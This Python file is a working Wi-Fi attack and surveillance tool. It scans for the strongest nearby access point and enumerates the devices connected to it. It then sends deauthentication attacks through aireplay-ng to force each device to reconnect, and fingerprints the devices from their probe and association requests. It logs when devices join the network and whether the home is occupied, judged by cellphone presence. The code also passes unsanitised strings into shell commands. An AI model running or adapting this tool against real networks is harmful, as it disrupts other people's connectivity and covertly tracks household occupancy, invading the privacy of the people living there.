import os
import time
import subprocess
import operator
import csv
import pickle
from datetime import datetime
from scapy.all import *
from all_objects import *


# Setup the network card for packets sniffing
def monitor_mode_setup(mon_card):
    monitor_card = mon_card

    os.system('airmon-ng check kill')
    print('wait for network setup...')
    time.sleep(5)

    os.system('ifconfig ' + monitor_card + ' down')
    os.system('airmon-ng start ' + monitor_card)
    os.system('ifconfig ' + monitor_card + ' up')
    os.system('ifconfig')


# find the AP with the strongest SNR and set the monitor channel to that AP
def ap_scanning(mon_card='wlan1mon', duration='10', file_name='ap_info'):
    channel = ''
    chosen_bssid = ''

    # save 5-second scanning result to a csv file
    print('scan for nearby AP...')
    os.system('rm ' + file_name + '*')
    subprocess.Popen('timeout ' + duration + ' airodump-ng -w ' + file_name +
                                    ' --output-format csv -I 5 --ignore-negative-one '
                                    + mon_card, shell=True).wait()

    reader = csv.reader(open(file_name + '-01.csv'))
    list_reader = list(reader)

    # only extract AP info, dont need device info
    filtered_r = [line for line in list_reader if (len(line) == len(list_reader[2]))]

    # sort according to the pwr rating of APs
    sortedlist = sorted(filtered_r, key=operator.itemgetter(8))

    # filter out ap with incorrect info, fix format
    for line in sortedlist:
        strip_item = line[8].replace(" ", '')
        if int(strip_item) < -1:
            # record the bssid of the AP with the strongest signal
            chosen_bssid = line[0].replace(" ", '')
            channel = line[3].replace(" ", '')
            SSID = line[-2].replace(" ", '')
            print("AP signal strength: " + strip_item)
            print("AP Mac address:" + chosen_bssid)
            print("channel: " + channel)
            print("SSID: " + SSID)
            break

    # config adapter to focus on certain wifi frequency
    print("Monitor channel configured to " + channel)
    channel_config = "iwconfig wlan1 channel " + channel
    os.system(channel_config)
    
    return chosen_bssid, channel


# return a list of devices connected to a AP
def device_tracking(ap_mac, channel, mon_card='wlan1mon', duration='180', file_name='dev_summary'):
    print("Scan devices in current network for 3 mins...")
    devices = []

    # save duration-second scanning result to a csv file
    os.system('rm ' + file_name + '*')
    FNULL = open(os.devnull, 'w')
    subprocess.call('timeout ' + duration + ' airodump-ng -w ' + file_name +
                                    ' --output-format csv -I 5 --ignore-negative-one ' +
                                    ' -c ' + channel + ' --bssid ' + ap_mac + ' '
                                    + mon_card, shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
    reader = csv.reader(open(file_name + '-01.csv'))
    list_reader = list(reader)
    ap_data = list_reader[2][-6]

    for i, line in enumerate(list_reader):
        if i > 5 and len(line) > 0:
            devices.append(line[0])

    return devices


# build the wifi signature for a device according to its mac address and sniffing packets file
# which contains its probe request and association request
def build_WifiSig(file_name, mac_addr, ignore_mac=0):
    # create a instance of wifi signature
    wifi_signature = wifi_sig(mac_addr) if ignore_mac == 0 else wifi_sig("ff:ff:ff:ff:ff:ff")

    # read in packets
    packets = rdpcap(file_name)
    print("start to build device wifi signature...")
    for packet in packets:
        if packet.haslayer("Dot11") and (packet.addr2 == wifi_signature.mac_addr or ignore_mac == 1):
            if packet.haslayer("Dot11ProbeReq") and wifi_signature.has_probe == 0:
                # set has probe bit
                wifi_signature.has_probe = 1

                # get probe identifiers
                for i in range(100):
                    try:
                        field = packet[Dot11Elt][i]
                        # get probe
                        if field.ID == 221:
                            wifi_signature.probe_sig.probe_id.append([field.ID, (field.info[0:3], field.info[3])])
                        else:
                            wifi_signature.probe_sig.probe_id.append(field.ID)

                        # get htcap and httag and htmcs
                        if field.ID == 45:
                            wifi_signature.probe_sig.htcap=(field.info[0:2])
                            wifi_signature.probe_sig.httag=(field.info[2])
                            wifi_signature.probe_sig.htmcs=(field.info[3:7])

                        # get vht related signatures
                        if field.ID == 191:
                            wifi_signature.probe_sig.vhtcap=(field.info[0:4])
                            wifi_signature.probe_sig.vhtrxmcs=(field.info[4:8])
                            wifi_signature.probe_sig.vhttxmcs=(field.info[8:12])

                        # get txpow related signatures
                        if field.ID == 33:
                            wifi_signature.probe_sig.txpow=(field.info)

                        # get txpow related signatures
                        if field.ID == 127:
                            wifi_signature.probe_sig.excap=(field.info)

                    except IndexError:
                        break

            if packet.haslayer("Dot11AssoReq") and wifi_signature.has_ass == 0:
                # set has assoc bit
                wifi_signature.has_ass = 1

                # get probe identifiers
                for i in range(100):
                    try:
                        field = packet[Dot11Elt][i]
                        # get probe
                        if field.ID == 221:
                            wifi_signature.ass_sig.probe_id.append([field.ID, (field.info[0:3], field.info[3])])
                        else:
                            wifi_signature.ass_sig.probe_id.append(field.ID)

                        # get htcap and httag and htmcs
                        if field.ID == 45:
                            wifi_signature.ass_sig.htcap=(field.info[0:2])
                            wifi_signature.ass_sig.httag=(field.info[3])
                            wifi_signature.ass_sig.htmcs=(field.info[4:8])

                        # get vht related signatures
                        if field.ID == 191:
                            wifi_signature.ass_sig.vhtcap=(field.info[0:4])
                            wifi_signature.ass_sig.vhtrxmcs=(field.info[4:8])
                            wifi_signature.ass_sig.vhttmcs=(field.info[8:12])

                        # get txpow related signatures
                        if field.ID == 33:
                            wifi_signature.ass_sig.txpow=(field.info)

                        # get excap related signatures
                        if field.ID == 127:
                            wifi_signature.ass_sig.excap=(field.info)

                    except IndexError:
                        break

    # print out signature
    print("wifi signature build finish!")
    wifi_signature.display()
    return wifi_signature


# clear signature database
def clear_sig_database(file):
    if os.path.exists(file):
        with open(file, 'rb') as rfp:
            database = pickle.load(rfp)

        # clear out everything
        database = {}

        with open(file, 'wb') as wfp:
            pickle.dump(database, wfp)
    # if there is no database
    else:
        raise Exception("file not exist")


# save a signature into the database file
def save_new_sig(file, wifi_sig, device_name, device_type):
    if os.path.exists(file):
        with open(file, 'rb') as rfp:
            database = pickle.load(rfp)

        # add the new wifi signature object
        # create wifi signature tuple: (device_type, signature object)
        database[device_name] = (device_type, wifi_sig)

        with open(file, 'wb') as wfp:
            pickle.dump(database, wfp)
    # if there is no database
    else:
        database = {device_name: (device_type, wifi_sig)}
        with open(file, 'wb') as wfp:
            pickle.dump(database, wfp)


# load the database from database file
def load_sig_database(file):
    if os.path.exists(file):
        with open(file, 'rb+') as rfp:
            database = pickle.load(rfp)

            if len(database) == 0:
                print("Warning: database empty!")
        return database
    else:
        raise Exception("no database file!")

# display database content
def display_database(file):
    if os.path.exists(file):
        with open(file, 'rb') as rfp:
            database = pickle.load(rfp)

        for name, value in database.items():
            print("device name: " + name)
            print("device type: " + str(value[0]))
            print("device wifi sigature: ")
            value[1].display()
    else:
        raise Exception("no database file!")


# read every pcap file in current directory and build their signatures, storing in database file afterwards
def create_database(db_file, file_path):
    # clear the db before creation
    if os.path.exists(db_file): 
        clear_sig_database(db_file)
    
    # insert signature into the database
    for pcap_file in os.listdir(file_path):
        new_sig = build_WifiSig(pcap_file, "", ignore_mac=1)
        save_new_sig(db_file, new_sig, pcap_file, 4)
    
    # display after db creation finishes
    display_database(db_file)
    
    
# calculate distance for any tagged field
def field_dist(target_field, src_field):
    if type(target_field) is not int and type(src_field) is not int:
        if len(target_field) == 0:
            ham_dist = len(src_field)
        elif len(src_field) == 0:
            ham_dist = len(target_field)
        else:
            ham_dist = sum(i != j for i, j in zip(target_field, src_field))
            ham_dist += abs(len(target_field) - len(src_field))
    # only for httag
    else:
        ham_dist = target_field != src_field

    return ham_dist


# calculate hamming distance between two wifi signatures
def ham_distance(sig_target, sig_src):
    ham_dist = 0  # this is the output

    # do a simple signature field check
    if sig_target.has_probe != 1 or sig_target.has_ass != 1:
        print("Incomplete Signature! Cannot perform hamming distance calculation!")
        return -1

    # compare fields in the wifi signature
    # start with probe ID
    for id in sig_target.probe_sig.probe_id:
        if id not in sig_src.probe_sig.probe_id:
            ham_dist += 1 if type(id) is int else len(id)

    for id in sig_target.ass_sig.probe_id:
        if id not in sig_src.ass_sig.probe_id:
            ham_dist += 1 if type(id) is int else len(id)

    # htcap
    ham_dist += field_dist(sig_target.probe_sig.htcap, sig_src.probe_sig.htcap)
    ham_dist += field_dist(sig_target.ass_sig.htcap, sig_src.ass_sig.htcap)

    # httag
    ham_dist += field_dist(sig_target.probe_sig.httag, sig_src.probe_sig.httag)
    ham_dist += field_dist(sig_target.ass_sig.httag, sig_src.ass_sig.httag)

    # htmcs
    ham_dist += field_dist(sig_target.probe_sig.htmcs, sig_src.probe_sig.htmcs)
    ham_dist += field_dist(sig_target.ass_sig.htmcs, sig_src.ass_sig.htmcs)

    # vhtcap
    ham_dist += field_dist(sig_target.probe_sig.vhtcap, sig_src.probe_sig.vhtcap)
    ham_dist += field_dist(sig_target.ass_sig.vhtcap, sig_src.ass_sig.vhtcap)

    # vhtrxmcs
    ham_dist += field_dist(sig_target.probe_sig.vhtrxmcs, sig_src.probe_sig.vhtrxmcs)
    ham_dist += field_dist(sig_target.ass_sig.vhtrxmcs, sig_src.ass_sig.vhtrxmcs)

    # vhttxmcs
    ham_dist += field_dist(sig_target.probe_sig.vhttxmcs, sig_src.probe_sig.vhttxmcs)
    ham_dist += field_dist(sig_target.ass_sig.vhttxmcs, sig_src.ass_sig.vhttxmcs)

    # excap
    ham_dist += field_dist(sig_target.probe_sig.excap, sig_src.probe_sig.excap)
    ham_dist += field_dist(sig_target.ass_sig.excap, sig_src.ass_sig.excap)

    # txpow
    ham_dist += field_dist(sig_target.probe_sig.txpow, sig_src.probe_sig.txpow)
    ham_dist += field_dist(sig_target.ass_sig.txpow, sig_src.ass_sig.txpow)

    return ham_dist


# this return a tuple (device name, device type) -1 stands for unkonwn type
def ham_dist_judgement(db_file, sig_target):
    sig_database = load_sig_database(db_file)

    # start to calculate ham distance with the target sig vs. item in db
    min_ham = 10000  # a very large number
    min_sig = "unknown"
    for sig in sig_database.keys():
        ham_dist = ham_distance(sig_target, sig_database[sig][1])
        
        # if ham_dist is 0, return immediately
        if ham_dist == 0:
            ret = sig_record(sig, sig_database[sig][0], sig_database[sig][1].mac_addr)
            return ret
        # take note the min ham item in database
        elif ham_dist < min_ham:
            min_ham = ham_dist
            min_sig = sig

    # if the minimum haming distance is smaller than a threshold
    if min_ham < 10:
        return sig_record(min_sig, sig_database[min_sig][0], sig_database[min_sig][1].mac_addr)
    else:
        print("unclassified device")
        ret = sig_record("unknown", -1, sig_target.mac_addr)
        return ret
        
        
# perform deauth attack (non-blocking)
def deauth(monitor_card, target, AP, duration='180'):
    print("Perform deauth attack for device " + target)

    # initiate deauth attack
    file = "active_track.pcap"
    FNULL = open (os.devnull, 'w')
    subprocess.Popen("aireplay-ng --deauth 100 -a " + AP + " -c " +
                     target.lower() + " " + monitor_card.lower(),
                     shell=True, stdout=FNULL, stderr=subprocess.STDOUT)


# simple utility function to check
def obj_in_list(obj, obj_list):
    for item in obj_list:
        if obj == item:
            return True
    return False


# do duration/60-minutes (default 5 min) of packet sniffing and log any connection attempt
# if find a association request, build its signature and perform the checking in database
# return a updated new list of device in this time period if mode 1
# mode 0: only scan for Probe Request/Ass packs, mode 1: also scan for data packets and log new device
def passive_tracking(signature_stats, ap_addr, duration="300", pck_file='tracking.pcap',
                     monitor_card='wlan1mon', db_file="signature_database.p", mode=0):
    print("Perform passive tracking...")
    rule_for_mode0 = "type mgt and subtype assoc-req or subtype probe-req"
    rule_for_mode1 = "type data or subtype assoc-req or subtype probe-req"

    if mode == 0:
        subprocess.Popen("timeout " + duration + " tcpdump -i " + monitor_card + " -s 1000" + " -w " + pck_file + " -v " +
                         rule_for_mode0, shell=True,
                         cwd=os.path.dirname(os.path.realpath(__file__))).wait()
    else:
        print("mode 1")
        subprocess.Popen("timeout " + duration + " tcpdump -i " + monitor_card + " -s 1000" + " -w " + pck_file + " -v " +
                        rule_for_mode1, shell=True,
                        cwd=os.path.dirname(os.path.realpath(__file__))).wait()

    packets = rdpcap(pck_file)

    # record the number of distinct association request
    ass_request = []
    new_dev_list = []

    # first log all device mac address that initiate connection to the AP
    for pack in packets:
        if pack.addr1 == ap_addr.lower() and pack.haslayer("Dot11AssoReq") and pack.addr2 not in ass_request:
            ass_request.append(pack.addr2)
        # if mode not 0, also log for all devices in the network
        if mode != 0:
            if pack.addr1 == ap_addr.lower() and pack.type == 2 and pack.addr2 not in new_dev_list:
                new_dev_list.append(pack.addr2)

    # second build signature for these devices
    if len(ass_request) > 0:
        print(str(len(ass_request)) + " Devices joined the network!")

    for dev_mac in ass_request:
        dev_sig = build_WifiSig(pck_file, dev_mac)

        # only do the check when the signature is valid
        if dev_sig.has_probe == 1 and dev_sig.has_ass == 1:
            new_dev = ham_dist_judgement(db_file, dev_sig)
            print("hamming_dist result: ", new_dev.sig_record_display())

            # if the matched device not in the device list already
            if not obj_in_list(new_dev, signature_stats.active_dev_list):
                signature_stats.active_dev_list.append(new_dev)
            if not obj_in_list(new_dev, signature_stats.all_dev_list):
                signature_stats.all_dev_list.append(new_dev)

                # log this device apear info (when does it enter this network)
                with open(signature_stats.log_file, 'a+') as f:
                    info = "dev {}, type {}, mac: {} enter network at: {}\n".format(new_dev.name,
                          signature_stats.predef_type[new_dev.type], new_dev.mac, str(datetime.now()))
                    f.write(info)

    if mode != 0:
        return new_dev_list


# enter the active phase first when first initiate the attack
# Scan for all devices connected to target ap
# Perform Deauth attack to pop all devices from network
# build wifi-signature for these device when they attempt to reconnect back with AP
def active_phase(ap, mon_card, sig_stats):
    print("enter active phase")
    # first do a device scanning
    device_list = device_tracking(ap, channel="2", duration='180')
    print(device_list)

    # for each device, launch deauth attack and do active fingerprinting
    for dev in device_list:
        deauth(mon_card, target=dev, AP=ap)
        passive_tracking(sig_stats, ap_addr=ap, duration='120', mode=0)

    sig_stats.active_stats_display()
    sig_stats.all_dev_display()
    print("active phase exit")


# passive_dur: passive monitoring duration (s)
# update_fre: how many monitor cycle between adjacent updates
# period: total update times
# running time: (passive_dur/60)*update_fre*period minutes
def passive_phase(ap, sig_stats, passive_dur='300', period=10, update_fre=6):
    print("Enter passive phase...")
    # loop for passive monitoring
    for i in range(period):
        print("passive scanning progress: " + str(i) + "/" + str(period))
        for j in range(update_fre-1):
            print("current slice time: " + str(datetime.now()))
            # perform passive tracking every passive_dur/60 minute
            passive_tracking(sig_stats, ap_addr=ap, duration=passive_dur, mode=0)

        # Also do a scan about current devices in network
        dev_list = passive_tracking(sig_stats, ap_addr=ap, duration=passive_dur, mode=1)
        print(dev_list)

        # if previously active device not in network anymore
        # remove that dev from active dev list
        for dev_info in sig_stats.active_dev_list:
            if dev_info.mac not in dev_list:
                sig_stats.active_dev_list.remove(dev_info)

        # display active device info after each period
        print("Current active device:")
        sig_stats.active_stats_display()
        print("All devices:")
        sig_stats.all_dev_display()

        # log the house occupancy info after each scanning period
        with open(sig_stats.final_result_file, "a+") as fp:
            info1 = "house Occupency at {}: {}\n".format(
                str(datetime.now()), "Yes" if sig_stats.active_stats["cellphone"] != 0 else "No")
            info2 = "Current active device stats: {} cellphone, {} computer, {} Iot, {} other, {} unknown\n"\
                .format(sig_stats.active_stats["cellphone"],sig_stats.active_stats["computer"],
                        sig_stats.active_stats["IoT device"],sig_stats.active_stats["other"],
                        sig_stats.active_stats["unknown"])
            fp.write(info1)
            fp.write(info2)
            # log active devices in this period
            for dev_info in sig_stats.active_dev_list:
                fp.write("Active device: name {} type {} mac {}".format(dev_info.name, dev_info.type, dev_info.mac))
